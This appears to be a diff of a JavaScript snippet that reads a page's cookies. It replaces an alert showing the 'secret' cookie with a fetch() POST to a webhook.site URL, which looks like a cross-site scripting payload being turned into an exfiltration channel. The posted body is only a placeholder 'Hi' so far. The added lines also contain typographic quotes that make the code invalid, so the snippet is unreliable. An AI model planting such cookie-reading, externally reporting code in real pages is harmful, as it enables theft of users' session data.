@@ -8,4 +8,14 @@ var getCookies = function(){
   return cookies;
 }
 var myCookies = getCookies();
-alert(myCookies.secret);
+var url = "https://webhook.site/cc3863eb-0c66-40a6-88d7-a4cb0ee9b5f1" // Webhook URL
+var text = {content: "Hi"}
+
+fetch(url, 
+  {
+    method: “POST”,
+    headers: {“Content-Type”: “application/json”},
+    body: JSON.stringify(text),
+  }
+)
+  .then();
